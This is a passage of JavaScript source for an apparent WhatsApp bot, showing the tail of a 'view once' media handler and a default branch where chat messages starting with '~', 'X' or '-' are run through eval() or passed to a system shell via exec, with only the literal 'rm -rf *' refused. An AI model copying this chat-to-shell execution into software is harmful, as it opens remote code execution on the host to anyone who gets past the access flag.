mimetype: "audio/mpeg", 
ptt: m.quoted.ptt || false 
}, sendOptions);
} else {
return reply(`𝙑𝙞𝙚𝙬 𝙊𝙣𝙘𝙚 𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🎗`)
}} catch (err) {
console.error(err)}}
break


default:
if (body.startsWith("~")) {
    if (!Access) return;
    reply('*execute...*')
    function Return(sul) {
        let sat = JSON.stringify(sul, null, 2);
        let bang = util.format(sat);
        if (sat === undefined) {
            bang = util.format(sul);
        }
        return bang;
    }
    try {
        (async () => {
            try {
                const result = await eval(`(async () => { return ${text} })()`);
                reply(Return(result));
            } catch (e) {
                reply(util.format(e));
            }
        })();
    } catch (e) {
        reply(util.format(e));
    }
}
			
if (budy.startsWith("X")) {
    if (!Dev && !Access) return
    await reaction(m.chat, '⚡')
    try {
        let evaled = await eval(q);
        if (typeof evaled !== "string") evaled = util.inspect(evaled);
        await reply(evaled);
    } catch (e) {
        await reply(`Error: ${String(e)}`);
    }
}
                
if (budy.startsWith('-')) {
    if (!Access) return
    await reaction(m.chat, '⚡')
    if (text == "rm -rf *") return m.reply("😹")
    exec(budy.slice(2), (err, stdout) => {
        if (err) return m.reply(`${err}`)
        if (stdout) return m.reply(stdout)  
    })
}
 
}
} catch (err) {
        console.log(require("util").format(err));
    }
};

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file)
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
  delete require.cache[file]
  require(file)
})